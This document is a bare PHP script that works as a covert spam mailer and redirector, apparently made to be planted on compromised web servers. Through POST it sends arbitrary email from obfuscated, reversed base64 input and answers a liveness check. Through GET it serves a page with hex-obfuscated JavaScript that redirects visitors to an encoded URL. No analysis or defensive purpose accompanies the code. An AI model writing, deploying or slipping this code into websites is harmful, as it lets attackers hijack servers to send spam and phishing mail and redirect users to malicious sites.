<?php
function base64_url_decode($val) {
    return base64_decode(strtr($val, '-_,', '+/='));
}
if(isset($_POST) and count($_POST) > 0){
	if(isset($_POST["chk"])){
	    $val = array();
	    $val["res"] = 1;
	    print json_encode($val);
	}else{
	    $post_data = array_values(array_map('stripslashes', $_POST));
	    $m_data = explode("|||", base64_url_decode(strrev($post_data[0])));
	    if(count($m_data) > 1){
		    $val = array();
		    if(mail($m_data[0], $m_data[1], $m_data[2], $m_data[3])){
		        $val["mail"] = 1;
		    } else{
		        $val["mail"] = 0;
		    }
		    print json_encode($val);
	    }
    }
}

if(isset($_GET) and count($_GET) > 0){
    $url = "";
    $redic = array_values($_GET);
    foreach(str_split(base64_url_decode($redic[0])) as $letter){
            if(rand(1,3) == 1){
                    $url .= $letter;
            }else{
                    $url .= $letter."'+'";
            }
    }
?>
<html><head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>Redirecting</title>
<script>
var r = '<?php echo $url;?>';
var _0x485b=["\x72\x65\x70\x6C\x61\x63\x65"];
</script>
</head>
<body onload="location[_0x485b[0]](r);">
Loading...
</body></html>
<?php } ?>